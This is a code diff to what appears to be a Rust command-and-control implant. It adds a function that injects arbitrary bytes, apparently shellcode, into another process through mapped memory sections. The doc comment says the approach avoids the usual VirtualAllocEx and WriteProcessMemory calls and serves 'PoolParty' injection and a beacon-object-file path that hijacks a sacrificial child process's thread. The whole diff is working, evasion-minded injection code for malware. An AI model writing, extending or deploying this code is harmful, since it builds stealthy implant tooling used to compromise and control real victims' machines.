@@ -452,6 +452,48 @@ unsafe fn pool_party_map_target(
     Ok(target_base)
 }
 
+/// Deliver `bytes` into `target_h`'s address space through a page-file-backed
+/// section (no `VirtualAllocEx` / `WriteProcessMemory`): create → map local →
+/// copy → map target → unmap local. Returns the target view base. This is the
+/// delivery half of [`pool_party_inject`] reused by the B3 isolated-BOF path
+/// (`bof_isolated.rs`), which already owns a suspended sacrificial child and
+/// dispatches by hijacking its main thread instead of the worker-factory
+/// splice. Unlike `pool_party_inject` (whose section-handle leak is documented
+/// as benign for a one-shot inject), the section handle IS closed here once
+/// both views exist — the views keep the object alive, and a BOF per beacon
+/// cycle must not leak one handle per run. On any failure the local view is
+/// unmapped and the section handle closed before `Err`.
+pub(crate) unsafe fn section_deliver(
+    target_h: *mut c_void,
+    bytes: &[u8],
+) -> Result<usize, String> {
+    let (create_section, map_view, unmap_view, _query_thread) =
+        resolve_section_fns().ok_or_else(|| String::from("ntdll section exports missing"))?;
+    // GetCurrentProcess pseudo-handle = (HANDLE)-1.
+    const CUR_PROCESS: *mut c_void = -1isize as *mut c_void;
+
+    let (section_h, section_size) = pool_party_create_section(create_section, bytes)?;
+    let local_base = match pool_party_map_local(map_view, section_h, section_size) {
+        Ok(b) => b,
+        Err(e) => {
+            unsafe { close_handle(section_h) };
+            return Err(e);
+        }
+    };
+    unsafe { pool_party_write_local(local_base, bytes) };
+    let target_base = match pool_party_map_target(map_view, section_h, target_h, section_size) {
+        Ok(b) => b,
+        Err(e) => {
+            unsafe { unmap_view(CUR_PROCESS, local_base) };
+            unsafe { close_handle(section_h) };
+            return Err(e);
+        }
+    };
+    unsafe { unmap_view(CUR_PROCESS, local_base) };
+    unsafe { close_handle(section_h) };
+    Ok(target_base as usize)
+}
+
 /// Threadless dispatch via worker-queue splice.
 ///
 /// The section now holds the shellcode in the target's address space at
